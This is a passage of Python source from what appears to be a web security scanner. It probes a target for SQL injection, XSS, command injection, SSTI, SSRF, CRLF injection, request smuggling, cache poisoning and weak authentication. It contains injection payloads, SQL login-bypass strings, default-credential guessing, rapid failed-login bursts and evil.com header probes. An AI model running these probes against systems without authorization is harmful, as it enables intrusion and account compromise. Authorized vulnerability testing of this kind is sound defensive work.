                            f"Parameter '{param}' appears vulnerable to SQL injection",
                            RiskRating.CRITICAL,
                            "Use parameterized queries/prepared statements. Implement input validation.",
                            "Web"
                        )
                        finding.add_evidence(f"Payload: {payload}")
                        self.report.add_finding(finding)
                        break
                        
                except:
                    pass
        
        # XSS Testing
        for param in parameters:
            for payload in XSS_PAYLOADS[:3]:  # Test first 3 payloads
                try:
                    test_url = f"{self.target}?{param}={payload}"
                    response = self.session.get(test_url)
                    
                    if payload in response.text and '<script>' in payload:
                        print(f"{CRITICAL} Possible XSS in parameter: {param}")
                        
                        finding = Finding(
                            "Cross-Site Scripting (XSS) Vulnerability",
                            f"Parameter '{param}' reflects input without proper encoding",
                            RiskRating.CRITICAL,
                            "Implement proper output encoding and Content-Security-Policy",
                            "Web"
                        )
                        finding.add_evidence(f"Payload: {payload}")
                        self.report.add_finding(finding)
                        break
                        
                except:
                    pass
        
        # Command Injection Testing (Time-Based & Output-Based)
        cmd_payloads = ['; ls', '| ls', '|| ls', '&& ls', '`ls`', '$(ls)', '; sleep 5', '| sleep 5', '|| sleep 5', '`sleep 5`']
        
        for param in parameters:
            for payload in cmd_payloads:
                try:
                    time.sleep(0.1)
                    test_url = f"{self.target}?{param}={payload}"
                    
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=10)
                    elapsed_time = time.time() - start_time
                    
                    # Check for command output in response
                    cmd_indicators = ['root:', 'bin:', 'boot:', 'etc:', 'home:', 'var:']
                    output_injected = any(indicator in response.text for indicator in cmd_indicators)
                    
                    if output_injected or (elapsed_time > 4.5 and 'sleep' in payload):
                        # Use a more accurate warning for time-based vs output-based
                        vuln_detail = "Time-Based OS Command Injection detected" if elapsed_time > 4.5 else "OS Command Injection detected via output"
                        print(f"{CRITICAL} Possible {vuln_detail} in parameter: {param}")
                        
                        finding = Finding(
                            "OS Command Injection Vulnerability",
                            f"Parameter '{param}' executes commands directly on the server OS.",
                            RiskRating.CRITICAL,
                            "Avoid system calls with user input. Use proper input validation and sanitization.",
                            "Web"
                        )
                        finding.add_evidence(f"Payload: {payload}")
                        self.report.add_finding(finding)
                        break
                        
                except requests.exceptions.Timeout:
                    if 'sleep' in payload:
                        print(f"{CRITICAL} Possible Time-based Command Injection (Timeout) in parameter: {param}")
                        finding = Finding(
                            "Time-Based Command Injection Vulnerability",
                            f"Parameter '{param}' caused a server timeout, likely executing: {payload}",
                            RiskRating.CRITICAL,
                            "Avoid system calls safely",
                            "Web"
                        )
                        finding.add_evidence(f"Payload: {payload}")
                        self.report.add_finding(finding)
                        break
                except:
                    pass
        
        # Server-Side Template Injection (SSTI) Testing
        print(f"\n{INFO} Testing parameters for SSTI")
        ssti_payloads = ['{{7*7}}', '${7*7}', '<% 7*7 %>', '#{7*7}', '[[7*7]]']
        for param in parameters:
            for payload in ssti_payloads:
                try:
                    time.sleep(0.1)
                    test_url = f"{self.target}?{param}={payload}"
                    response = self.session.get(test_url)
                    
                    # Since 7*7 is 49, if the evaluated mathematical formula evaluates to 49 
                    # while the payload input itself vanished, SSTI is highly probable.
                    if '49' in response.text and payload not in response.text:
                        print(f"{CRITICAL} Server-Side Template Injection in parameter: {param}")
                        
                        finding = Finding(
                            "Server-Side Template Injection",
                            f"Parameter '{param}' is evaluated dynamically within an insecure template environment.",
                            RiskRating.CRITICAL,
                            "Use a strictly structured, non-executable templating engine configuration. Do not pass user input directly into generic templating parsers.",
                            "Web"
                        )
                        finding.add_evidence(f"Executed Mathematical Payload: {payload} rendered as 49")
                        self.report.add_finding(finding)
                        break
                except:
                    pass
    
    def check_insecure_design(self):
        """Check for insecure design flaws"""
        print(f"\n{INFO} Checking for Insecure Design")
        
        # Check for debug endpoints
        debug_endpoints = [
            '/debug', '/debug/', '/trace', '/trace/',
            '/actuator', '/actuator/health', '/actuator/info',
            '/swagger', '/swagger-ui', '/api-docs', '/v2/api-docs',
            '/graphql', '/graphiql', '/console', '/h2-console',
            '/phpinfo.php', '/info.php', '/test.php', '/.git'
        ]
        
        for endpoint in debug_endpoints:
            try:
                url = urljoin(self.target, endpoint)
                response = self.session.get(url)
                
                if response.status_code == 200:
                    print(f"{WARNING} Debug endpoint exposed: {endpoint}")
                    
                    finding = Finding(
                        "Debug Endpoint Exposed",
                        f"Sensitive debug/information endpoint accessible at {endpoint}",
                        RiskRating.HIGH,
                        "Remove or restrict access to debug endpoints in production",
                        "Web"
                    )
                    self.report.add_finding(finding)
            except:
                pass
    
    def check_misconfiguration(self):
        """Check for security misconfigurations"""
        print(f"\n{INFO} Checking for Security Misconfigurations")
        
        # Check for default credentials
        default_creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('administrator', 'administrator'),
            ('root', 'root'),
            ('user', 'user'),
            ('test', 'test'),
            ('guest', 'guest')
        ]
        
        # Find login forms
        for form in self.forms:
            action = form.get('action', '')
            method = form.get('method', 'get').lower()
            
            if 'login' in action.lower() or 'login' in str(form).lower():
                # Try default credentials
                for username, password in default_creds:
                    try:
                        if method == 'post':
                            data = {'username': username, 'password': password, 'login': 'submit'}
                            # Adjust field names based on common patterns
                            for input_tag in form.find_all('input'):
                                name = input_tag.get('name', '')
                                if 'user' in name.lower():
                                    data[name] = username
                                elif 'pass' in name.lower():
                                    data[name] = password
                            
                            response = self.session.post(urljoin(self.target, action), data=data)
                        else:
                            params = {'username': username, 'password': password}
                            response = self.session.get(urljoin(self.target, action), params=params)
                        
                        # Check if login successful (based on response)
                        if response.status_code == 200 and ('welcome' in response.text.lower() or 'dashboard' in response.text.lower()):
                            print(f"{CRITICAL} Default credentials working: {username}/{password}")
                            
                            finding = Finding(
                                "Default Credentials Working",
                                f"Login form accepts default credentials: {username}/{password}",
                                RiskRating.CRITICAL,
                                "Change all default credentials immediately. Implement account lockout policies.",
                                "Web"
                            )
                            self.report.add_finding(finding)
                            break
                            
                    except:
                        pass
        
        # Check for CORS misconfiguration
        try:
            headers = {
                'Origin': 'https://evil.com',
                'Host': urlparse(self.target).hostname
            }
            response = self.session.options(self.target, headers=headers)
            
            if 'access-control-allow-origin' in response.headers:
                if response.headers['access-control-allow-origin'] == '*':
                    print(f"{WARNING} CORS misconfiguration: Wildcard origin allowed")
                    
                    finding = Finding(
                        "CORS Misconfiguration",
                        "Server allows wildcard origin with credentials, which is insecure",
                        RiskRating.MEDIUM,
                        "Restrict CORS to specific trusted domains only",
                        "Web"
                    )
                    self.report.add_finding(finding)
                    
        except:
            pass
        
        # Check for open redirects
        redirect_params = ['redirect', 'url', 'next', 'return', 'returnUrl', 'return_to', 'goto']
        
        for param in redirect_params:
            try:
                test_url = f"{self.target}?{param}=https://evil.com"
                response = self.session.get(test_url, allow_redirects=False)
                
                if response.status_code in [301, 302] and 'evil.com' in response.headers.get('Location', ''):
                    print(f"{WARNING} Open redirect vulnerability in parameter: {param}")
                    
                    finding = Finding(
                        "Open Redirect Vulnerability",
                        f"Parameter '{param}' allows redirect to arbitrary external domains",
                        RiskRating.MEDIUM,
                        "Validate and whitelist redirect URLs. Avoid using user input for redirects.",
                        "Web"
                    )
                    self.report.add_finding(finding)
            except:
                pass
    
    def check_vulnerable_components(self):
        """Check for vulnerable components"""
        print(f"\n{INFO} Checking for Vulnerable Components")
        
        # Check for exposed dependency files
        dep_files = [
            '/package.json', '/composer.json', '/requirements.txt',
            '/Gemfile.lock', '/yarn.lock', '/package-lock.json',
            '/pom.xml', '/build.gradle', '/go.mod', '/Cargo.toml'
        ]
        
        for dep_file in dep_files:
            try:
                url = urljoin(self.target, dep_file)
                response = self.session.get(url)
                
                if response.status_code == 200:
                    print(f"{WARNING} Dependency file exposed: {dep_file}")
                    
                    finding = Finding(
                        f"Dependency File Exposed: {dep_file}",
                        f"The file {dep_file} reveals application dependencies",
                        RiskRating.MEDIUM,
                        f"Restrict access to {dep_file} or move it outside the web root",
                        "Web"
                    )
                    self.report.add_finding(finding)
            except:
                pass
        
        # Detect jQuery version
        try:
            response = self.session.get(self.target)
            jquery_matches = re.findall(r'jquery[/-]?([\d.]+)(?:\.min)?\.js', response.text, re.I)
            
            if jquery_matches:
                jquery_version = jquery_matches[0]
                print(f"{INFO} jQuery version detected: {jquery_version}")
                
                # Check for vulnerable versions
                vulnerable_versions = {
                    '<1.9.0': ['CVE-2012-6708', 'XSS vulnerability'],
                    '<1.12.0': ['CVE-2015-9251', 'XSS vulnerability'],
                    '<3.0.0': ['CVE-2016-7103', 'XSS vulnerability']
                }
                
                for version_range, vuln_info in vulnerable_versions.items():
                    if jquery_version < version_range.replace('<', ''):
                        print(f"{WARNING} jQuery version {jquery_version} may be vulnerable")
                        
                        finding = Finding(
                            "Vulnerable jQuery Version",
                            f"jQuery {jquery_version} has known vulnerabilities: {', '.join(vuln_info)}",
                            RiskRating.MEDIUM,
                            "Update jQuery to the latest secure version",
                            "Web"
                        )
                        self.report.add_finding(finding)
                        break
        except:
            pass
    
    def check_auth_failures(self):
        """Check for authentication failures"""
        print(f"\n{INFO} Checking for Authentication Failures")
        
        # Check session cookie security
        if self.session.cookies:
            for cookie in self.session.cookies:
                issues = []
                
                if not cookie.secure:
                    issues.append("Missing Secure flag")
                if not cookie.has_nonstandard_attr('HttpOnly'):
                    issues.append("Missing HttpOnly flag")
                if not cookie.domain_specified:
                    issues.append("Domain not specified")
                
                if issues:
                    print(f"{WARNING} Cookie '{cookie.name}' has security issues: {', '.join(issues)}")
                    
                    finding = Finding(
                        "Insecure Session Cookie",
                        f"Cookie '{cookie.name}' lacks security flags: {', '.join(issues)}",
                        RiskRating.MEDIUM if 'HttpOnly' in str(issues) else RiskRating.LOW,
                        "Set Secure, HttpOnly flags and proper domain/path for session cookies",
                        "Web"
                    )
                    self.report.add_finding(finding)
        
        # Check for login forms and test Auth Bypass techniques
        for form in self.forms:
            form_str = str(form).lower()
            if 'login' in form_str or 'signin' in form_str or 'password' in form_str:
                form_action = urljoin(self.target, form.get('action', ''))
                
                # 1. Missing anti-CSRF token check on login
                if 'csrf' not in form_str and 'authenticity_token' not in form_str and 'token' not in form_str:
                    print(f"{WARNING} Login form missing anti-CSRF token")
                    finding = Finding("Missing Anti-CSRF Token on Login", "The login form appears to lack an unpredictable anti-CSRF token.", RiskRating.MEDIUM, "Implement unpredictable anti-CSRF tokens for all state-changing requests, including login forms.", "Web")
                    self.report.add_finding(finding)
                
                try:
                    # 2. Test for Username Enumeration via responses
                    data1 = {'username': 'nonexistentuser123456', 'password': 'wrongpass1'}
                    response1 = self.session.post(form_action, data=data1)
                    
                    data2 = {'username': 'admin', 'password': 'wrongpass2'}
                    response2 = self.session.post(form_action, data=data2)
                    
                    if response1.text != response2.text:
                        print(f"{WARNING} Possible username enumeration detected via error message diff")
                        finding = Finding("Username Enumeration Possible", "Login form reveals whether a username exists or not via error message differences.", RiskRating.MEDIUM, "Return generic error messages for both invalid username and password.", "Web")
                        self.report.add_finding(finding)
                except:
                    pass
                
                # 3. SQLi Auth Bypass Test
                auth_bypass_payloads = [
                    ("' OR '1'='1", "' OR '1'='1"),
                    ("admin' --", "password"),
                    ("admin' #", "password"),
                    ("admin' /*", "password"),
                    ("' OR 1=1#", "password")
                ]
                for user_payload, pass_payload in auth_bypass_payloads:
                    try:
                        time.sleep(0.1)
                        data = {'username': user_payload, 'password': pass_payload}
                        resp = self.session.post(form_action, data=data, allow_redirects=False)
                        # If bypass works, server likely redirects (301/302) to a dashboard instead of returning back to login
                        if resp.status_code in [301, 302] and 'login' not in resp.headers.get('Location', '').lower():
                            print(f"{CRITICAL} SQLi Auth Bypass successful using: {user_payload}")
                            finding = Finding("SQL Injection Authentication Bypass", f"Successfully bypassed login using payload: {user_payload}", RiskRating.CRITICAL, "Use parameterized queries or prepared statements.", "Web")
                            self.report.add_finding(finding)
                            break
                    except:
                        pass
                
                # 4. Default Credentials Guessing
                default_creds = [('admin', 'admin'), ('admin', 'password'), ('root', 'root')]
                for user, pwd in default_creds:
                    try:
                        time.sleep(0.1)
                        data = {'username': user, 'password': pwd}
                        resp = self.session.post(form_action, data=data, allow_redirects=False)
                        if resp.status_code in [301, 302] and 'login' not in resp.headers.get('Location', '').lower():
                            print(f"{CRITICAL} Default Credentials accepted: {user}:{pwd}")
                            finding = Finding("Default Credentials Preserved", f"Login accepted default system credentials: {user}:{pwd}", RiskRating.CRITICAL, "Change default credentials immediately.", "Web")
                            self.report.add_finding(finding)
                            break
                    except:
                        pass
                
                # 5. Lockout Testing (Brute-force protection check)
                try:
                    print(f"{INFO} Testing Rate Limiting / Lockout on Login...")
                    locked_out = False
                    for i in range(12):  # Send 12 rapid failed logins
                        data = {'username': 'testuserlockout', 'password': f'wrongpass{i}'}
                        resp = self.session.post(form_action, data=data)
                        if resp.status_code == 429 or 'captcha' in resp.text.lower() or 'locked' in resp.text.lower() or 'too many' in resp.text.lower():
                            locked_out = True
                            print(f"{SUCCESS} Brute-force protection / rate-limiting detected on login!")
                            break
                    
                    if not locked_out:
                        print(f"{WARNING} Missing Brute-Force/Lockout protection on Login")
                        finding = Finding("Missing Login Brute-Force Protection", "Application allowed 12 rapid consecutive failed authentication attempts without blocking or throttling.", RiskRating.HIGH, "Implement account lockout mechanisms, IP rate-limiting, or CAPTCHA.", "Web")
                        self.report.add_finding(finding)
                except:
                    pass
                    
                break  # Only perform these rigorous tests on the first detected login form
    
    def check_integrity_failures(self):
        """Check for integrity failures"""
        print(f"\n{INFO} Checking for Integrity Failures")
        
        try:
            response = self.session.get(self.target)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Check for scripts without SRI
            scripts = soup.find_all('script', src=True)
            for script in scripts:
                src = script['src']
                if not script.get('integrity') and not script.get('crossorigin'):
                    if src.startswith('http') and not src.startswith(urlparse(self.target).netloc):
                        print(f"{WARNING} External script without SRI: {src}")
                        
                        finding = Finding(
                            "Missing Subresource Integrity",
                            f"External script {src} loaded without SRI hash",
                            RiskRating.LOW,
                            "Add integrity and crossorigin attributes to external scripts",
                            "Web"
                        )
                        self.report.add_finding(finding)
                        break  # Report once
                        
        except Exception as e:
            if self.verbose:
                print(f"{WARNING} Integrity check failed: {str(e)}")
    
    def check_logging_failures(self):
        """Check for logging and monitoring failures"""
        print(f"\n{INFO} Checking for Logging Failures")
        
        # Test for verbose errors
        error_triggers = [
            "'", '"', '\\', ';', '|', '&', '$', '%', '#', '@',
            '?', '=', '+', '-', '*', '/', '!', '`', '~'
        ]
        
        for trigger in error_triggers:
            try:
                test_url = f"{self.target}{trigger}"
                response = self.session.get(test_url)
                
                # Check for stack traces
                stack_indicators = [
                    'stack trace', 'at ', 'line ', 'exception',
                    'error', 'warning', 'fatal', 'uncaught',
                    'on line', 'in /var/www', 'in C:\\'
                ]
                
                if response.status_code >= 500:
                    response_text = response.text.lower()
                    if any(indicator in response_text for indicator in stack_indicators):
                        print(f"{WARNING} Verbose error page detected")
                        
                        finding = Finding(
                            "Verbose Error Messages",
                            "Application reveals stack traces or internal paths in error pages",
                            RiskRating.MEDIUM,
                            "Implement custom error pages and disable detailed error messages in production",
                            "Web"
                        )
                        self.report.add_finding(finding)
                        break
                        
            except:
                pass
    
    def check_ssrf(self):
        """Check for Server-Side Request Forgery"""
        print(f"\n{INFO} Checking for SSRF")
        
        # Get baseline response to prevent false positives
        try:
            baseline_text = self.session.get(self.target, timeout=5).text.lower()
        except:
            baseline_text = ""
            
        # Find parameters that might be URLs
        url_params = ['url', 'uri', 'path', 'dest', 'redirect', 'return', 
                      'next', 'src', 'source', 'load', 'file', 'document']
        
        # Refined specific indicators
        ssrf_indicators = [
            'root:x:', 'daemon:x:', 'etc/passwd', 'latest/meta-data',
            'computeMetadata', 'instance-id', 'ami-id', 'elasticsearch'
        ]
        
        for param in url_params:
            for payload in SSRF_PAYLOADS[:3]:  # Test first few payloads
                try:
                    test_url = f"{self.target}?{param}={payload}"
                    response = self.session.get(test_url, timeout=5)
                    response_text = response.text.lower()
                    
                    # Check for signs of SSRF
                    for indicator in ssrf_indicators:
                        if indicator in response_text and indicator not in baseline_text:
                            print(f"{CRITICAL} Possible SSRF found in parameter: {param}")
                            print(f"       -> Exact Location: {test_url}")
                            
                            finding = Finding(
                                "Server-Side Request Forgery (SSRF)",
                                f"Parameter '{param}' appears to allow fetching internal resources",
                                RiskRating.CRITICAL,
                                "Implement URL whitelisting, validate and sanitize URL inputs",
                                "Web"
                            )
                            finding.add_evidence(f"Vulnerable URL: {test_url}")
                            finding.add_evidence(f"Indicator matched: {indicator}")
                            self.report.add_finding(finding)
                            break
                            
                except:
                    pass
    
    def additional_checks(self):
        """Perform additional security checks"""
        print(f"\n{INFO} Performing Additional Checks")
        
        # Check for clickjacking
        if 'X-Frame-Options' not in self.headers:
            print(f"{WARNING} Site may be vulnerable to clickjacking")
            
            finding = Finding(
                "Clickjacking Vulnerability",
                "X-Frame-Options header missing, site can be embedded in iframes",
                RiskRating.MEDIUM,
                "Add X-Frame-Options: DENY or SAMEORIGIN header",
                
                "Web"
            )
            self.report.add_finding(finding)
        
        # Check for file upload vulnerabilities
        for form in self.forms:
            enctype = form.get('enctype', '')
            if 'multipart/form-data' in enctype:
                print(f"{WARNING} File upload form detected")
                
                # Test dangerous file extensions
                dangerous_extensions = ['.php', '.php5', '.phtml', '.asp', '.aspx', '.jsp', '.exe']
                
                for ext in dangerous_extensions:
                    try:
                        files = {'file': (f'test{ext}', 'test content', 'text/plain')}
                        response = self.session.post(urljoin(self.target, form.get('action', '')), files=files)
                        
                        if response.status_code == 200 and 'uploaded' in response.text.lower():
                            print(f"{CRITICAL} File upload may accept dangerous extension: {ext}")
                            
                            finding = Finding(
                                "Insecure File Upload",
                                f"File upload accepts {ext} files which could lead to RCE",
                                RiskRating.CRITICAL,
                                "Validate file types on server-side, store files outside web root",
                                "Web"
                            )
                            self.report.add_finding(finding)
                            break
                            
                    except:
                        pass
                
                break
        
        # Check for path traversal
        parameters = set()
        
        # Extract parameters from forms
        for form in self.forms:
            inputs = form.find_all('input')
            for input_tag in inputs:
                name = input_tag.get('name')
                if name:
                    parameters.add(name)
        
        # Extract parameters from URL
        parsed = urlparse(self.target)
        if parsed.query:
            for param in parse_qs(parsed.query):
                parameters.add(param)

        for param in parameters:
            for payload in PATH_TRAVERSAL:
                try:
                    test_url = f"{self.target}?{param}={payload}"
                    response = self.session.get(test_url)
                    
                    traversal_indicators = ['root:x:', 'daemon:x:', 'bin:x:', '[extensions]']
                    if any(indicator in response.text for indicator in traversal_indicators):
                        print(f"{CRITICAL} Path traversal in parameter: {param}")
                        
                        finding = Finding(
                            "Path Traversal Vulnerability",
                            f"Parameter '{param}' allows directory traversal",
                            RiskRating.CRITICAL,
                            "Validate file paths, use whitelist of allowed files",
                            "Web"
                        )
                        self.report.add_finding(finding)
                        break
                        
                except:
                    pass

    def check_host_header_injection(self):
        """Check for Host Header Injection (password reset poisoning, cache poisoning)"""
        print(f"\n{INFO} Checking for Host Header Injection")
        
        hostname = urlparse(self.target).hostname
        
        # Test 1: Arbitrary Host header
        test_cases = [
            {'Host': 'evil.com'},
            {'Host': f'{hostname}\r\nX-Injected: header'},
            {'Host': f'{hostname}@evil.com'},
            {'Host': f'evil.com', 'X-Forwarded-Host': 'evil.com'},
            {'X-Forwarded-Host': 'evil.com'},
            {'X-Host': 'evil.com'},
            {'X-Forwarded-Server': 'evil.com'},
            {'X-Original-URL': '/admin'},
            {'X-Rewrite-URL': '/admin'},
        ]
        
        try:
            # Get baseline response
            baseline = self.session.get(self.target, timeout=5)
            baseline_text = baseline.text.lower()
        except:
            return
        
        for headers in test_cases:
            try:
                time.sleep(0.1)
                response = self.session.get(self.target, headers=headers, timeout=5)
                response_text = response.text.lower()
                
                # Check if evil.com appears in the response (reflected in links, forms, etc.)
                injected_host = 'evil.com'
                if injected_host in response_text and injected_host not in baseline_text:
                    header_name = list(headers.keys())[0]
                    print(f"{CRITICAL} Host Header Injection via {header_name}!")
                    
                    finding = Finding(
                        "Host Header Injection",
                        f"The application reflects the injected Host header value '{injected_host}' "
                        f"in the response via {header_name}. This can enable password reset poisoning, "
                        f"web cache poisoning, and SSRF attacks.",
                        RiskRating.HIGH,
                        "1. Configure the web server to use a whitelist of allowed Host headers.\n"
                        "    2. Avoid using the Host header to generate URLs in the application.\n"
                        "    3. Use a fixed SERVER_NAME configuration.\n"
                        "    4. Ignore X-Forwarded-Host unless explicitly needed behind a trusted proxy.",
                        "Web"
                    )
                    finding.add_evidence(f"Injected header: {headers}")
                    self.report.add_finding(finding)
                    break
                    
            except:
                pass
        
        # Test 2: Password reset poisoning specifically
        reset_paths = ['/password/reset', '/forgot-password', '/reset-password',
                       '/api/password/reset', '/auth/forgot', '/users/password/new']
        
        for path in reset_paths:
            try:
                url = urljoin(self.target, path)
                resp = self.session.get(url, timeout=5)
                if resp.status_code == 200 and ('email' in resp.text.lower() or 'reset' in resp.text.lower()):
                    # Try submitting with poisoned host
                    poisoned_resp = self.session.post(
                        url,
                        data={'email': 'test@test.com'},
                        headers={'Host': 'evil.com'},
                        timeout=5
                    )
                    if poisoned_resp.status_code in [200, 302]:
                        print(f"{WARNING} Password reset form found at {path} (test Host injection manually)")
                        finding = Finding(
                            "Password Reset Poisoning Risk",
                            f"Password reset form at {path} may be vulnerable to Host header poisoning. "
                            f"If the reset link uses the Host header, attackers can steal reset tokens.",
                            RiskRating.MEDIUM,
                            "Generate password reset URLs using a hardcoded, trusted domain.",
                            "Web"
                        )
                        self.report.add_finding(finding)
                        break
            except:
                pass
    
    def check_crlf_injection(self):
        """Check for CRLF Injection (HTTP Response Splitting)"""
        print(f"\n{INFO} Checking for CRLF Injection")
        
        crlf_payloads = [
            '%0d%0aX-CRLF-Test:injected',
            '%0aX-CRLF-Test:injected',
            '%0dX-CRLF-Test:injected',
            '%E5%98%8A%E5%98%8DX-CRLF-Test:injected',  # Unicode CRLF
            '\\r\\nX-CRLF-Test:injected',
        ]
        
        # Test in URL path and common redirect parameters
        test_vectors = []
        
        # Test in URL path
        for payload in crlf_payloads:
            test_vectors.append(f"{self.target}/{payload}")
        
        # Test in redirect parameters
        redirect_params = ['url', 'redirect', 'next', 'return', 'dest', 'path']
        for param in redirect_params:
            for payload in crlf_payloads[:2]:  # Limit payloads per param
                test_vectors.append(f"{self.target}?{param}={payload}")
        
        for test_url in test_vectors:
            try:
                time.sleep(0.1)
                response = self.session.get(test_url, allow_redirects=False, timeout=5)
                
                # Check if our injected header appears in response headers
                if 'X-CRLF-Test' in str(response.headers):
                    print(f"{CRITICAL} CRLF Injection detected!")
                    
                    finding = Finding(
                        "CRLF Injection (HTTP Response Splitting)",
                        f"The application allows injection of arbitrary HTTP headers via CRLF characters. "
                        f"This can enable HTTP response splitting, XSS via injected headers, "
                        f"cache poisoning, and session fixation.",
                        RiskRating.HIGH,
                        "1. Strip or reject CR (\\r) and LF (\\n) characters from all user input.\n"
                        "    2. Use framework-provided URL redirect functions that auto-sanitize.\n"
                        "    3. Encode output when setting HTTP headers.",
                        "Web"
                    )
                    finding.add_evidence(f"Payload URL: {test_url}")
                    finding.add_evidence(f"Injected header found in response")
                    self.report.add_finding(finding)
                    return  # Report once
                    
            except:
                pass
    
    def check_http_request_smuggling(self):
        """Detect potential HTTP Request Smuggling (CL.TE / TE.CL)"""
        print(f"\n{INFO} Checking for HTTP Request Smuggling")
        
        hostname = urlparse(self.target).hostname
        port = 443 if self.target.startswith('https') else 80
        use_ssl = self.target.startswith('https')
        
        try:
            # Test 1: CL.TE detection — send ambiguous Content-Length + Transfer-Encoding
            # We send a safe probe that won't cause damage
            smuggle_request = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {hostname}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 6\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"0\r\n"
                f"\r\n"
                f"G"
            )
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=hostname)
            
            sock.connect((hostname, port))
            sock.send(smuggle_request.encode())
            
            response = b''
            try:
                while True:
                    data = sock.recv(4096)
                    if not data:
                        break
                    response += data
            except socket.timeout:
                pass
            finally:
                sock.close()
            
            response_str = response.decode('utf-8', errors='ignore')
            
            # Check for indicators of smuggling vulnerability
            # If server processes both CL and TE differently, it may indicate vulnerability
            if 'HTTP/1.1 400' in response_str or 'Bad Request' in response_str.lower():
                # Server rejected the ambiguous request — likely has protections
                if self.verbose:
                    print(f"{SUCCESS} Server rejects ambiguous CL/TE requests (good)")
            elif 'HTTP/1.1 200' in response_str or 'HTTP/1.1 301' in response_str or 'HTTP/1.1 302' in response_str:
                print(f"{WARNING} Server may accept ambiguous CL/TE headers (potential smuggling)")
                
                finding = Finding(
                    "Potential HTTP Request Smuggling",
                    "The server accepted a request with both Content-Length and Transfer-Encoding headers "
                    "without rejecting it. This may indicate vulnerability to HTTP Request Smuggling "
                    "(CL.TE or TE.CL), which can enable cache poisoning, auth bypass, and request hijacking.",
                    RiskRating.HIGH,
                    "1. Configure the web server to reject requests with both CL and TE headers.\n"
                    "    2. Use HTTP/2 end-to-end where possible.\n"
                    "    3. Normalize incoming requests at the load balancer/proxy.\n"
                    "    4. Ensure front-end and back-end servers agree on request boundaries.",
                    "Web"
                )
                self.report.add_finding(finding)
                
        except Exception as e:
            if self.verbose:
                print(f"{WARNING} HTTP smuggling check failed: {str(e)}")
    
    def check_cache_poisoning(self):
        """Check for Web Cache Poisoning via unkeyed headers"""
        print(f"\n{INFO} Checking for Web Cache Poisoning")
        
        # Unkeyed headers that caches typically ignore but backends may process
        poison_headers = [
            {'X-Forwarded-Host': 'evil.com'},
            {'X-Original-URL': '/admin'},
            {'X-Rewrite-URL': '/admin'},
            {'X-Forwarded-Scheme': 'http'},
            {'X-Forwarded-Proto': 'http'},
            {'X-Custom-IP-Authorization': '127.0.0.1'},
            {'X-Forwarded-Port': '4443'},
            {'X-Forwarded-For': '127.0.0.1'},
        ]
        
        # Cache buster to get fresh responses
        cache_buster = f"cb={int(time.time())}"
        
        try:
            # Get baseline
            baseline_url = f"{self.target}?{cache_buster}1"
            baseline = self.session.get(baseline_url, timeout=5)
            baseline_text = baseline.text.lower()
            
            for headers in poison_headers:
                try:
                    time.sleep(0.2)
                    poisoned_url = f"{self.target}?{cache_buster}2"
                    response = self.session.get(poisoned_url, headers=headers, timeout=5)
                    response_text = response.text.lower()
                    
                    header_name = list(headers.keys())[0]
                    header_value = list(headers.values())[0]
                    
                    # Check if the injected value appears in response
                    if header_value.lower() in response_text and header_value.lower() not in baseline_text:
                        print(f"{WARNING} Cache Poisoning possible via {header_name}")
                        
                        # Verify by fetching the same URL without the header
                        time.sleep(0.5)
                        verify = self.session.get(poisoned_url, timeout=5)
                        
                        if header_value.lower() in verify.text.lower():
                            # Value persisted — cache was poisoned!
                            print(f"{CRITICAL} Web Cache Poisoning CONFIRMED via {header_name}!")
                            finding = Finding(
                                "Web Cache Poisoning",
                                f"The cache serves poisoned content injected via the unkeyed header '{header_name}'. "
                                f"Attackers can inject malicious content that gets cached and served to all users.",
                                RiskRating.HIGH,
                                "1. Include security-relevant headers in the cache key.\n"
                                "    2. Strip or normalize unkeyed headers at the CDN/proxy level.\n"
                                "    3. Disable caching for sensitive pages.\n"
                                "    4. Use Vary header to include relevant request headers in cache key.",
                                "Web"
                            )
                            finding.add_evidence(f"Poisoned via: {header_name}: {header_value}")
                            self.report.add_finding(finding)
                            return
                        else:
                            # Value reflected but not cached
                            finding = Finding(
                                "Unkeyed Header Reflection (Potential Cache Poisoning)",
                                f"The header '{header_name}' is reflected in the response but may not be cached. "
                                f"If caching is enabled upstream, this could lead to cache poisoning.",
                                RiskRating.MEDIUM,
                                "Strip or reject unkeyed headers that influence response content.",
                                "Web"
                            )
                            self.report.add_finding(finding)
                            return
                            
                except:
                    pass
                    
        except Exception as e:
            if self.verbose:
                print(f"{WARNING} Cache poisoning check failed: {str(e)}")
    
    def check_websocket_endpoints(self):
        """Discover and test WebSocket endpoints"""
        print(f"\n{INFO} Checking for WebSocket Endpoints")
        
        ws_paths = [
            '/ws', '/ws/', '/websocket', '/websocket/', '/socket',
            '/socket.io/', '/sockjs/', '/cable', '/hub', '/signalr',
            '/realtime', '/live', '/stream', '/events', '/notifications/ws',
            '/api/ws', '/api/v1/ws', '/api/stream', '/chat/ws'
        ]
        
        hostname = urlparse(self.target).hostname
        port = 443 if self.target.startswith('https') else 80
        use_ssl = self.target.startswith('https')
        
        found_any = False
        
        for ws_path in ws_paths:
            try:
                # Send a WebSocket upgrade request
                upgrade_request = (
                    f"GET {ws_path} HTTP/1.1\r\n"
                    f"Host: {hostname}\r\n"
                    f"Upgrade: websocket\r\n"
                    f"Connection: Upgrade\r\n"
                    f"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
                    f"Sec-WebSocket-Version: 13\r\n"
                    f"Origin: https://evil.com\r\n"
                    f"\r\n"
                )
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                
                if use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=hostname)
                
                sock.connect((hostname, port))
                sock.send(upgrade_request.encode())
                
                response = sock.recv(4096).decode('utf-8', errors='ignore')
                sock.close()
                
                if '101' in response and 'Switching Protocols' in response:
                    found_any = True
                    print(f"{WARNING} WebSocket endpoint found: {ws_path}")
                    
                    # Check if origin validation is missing
                    origin_issue = 'evil.com' not in response.lower()  # If evil origin was accepted
                    
                    risk = RiskRating.MEDIUM
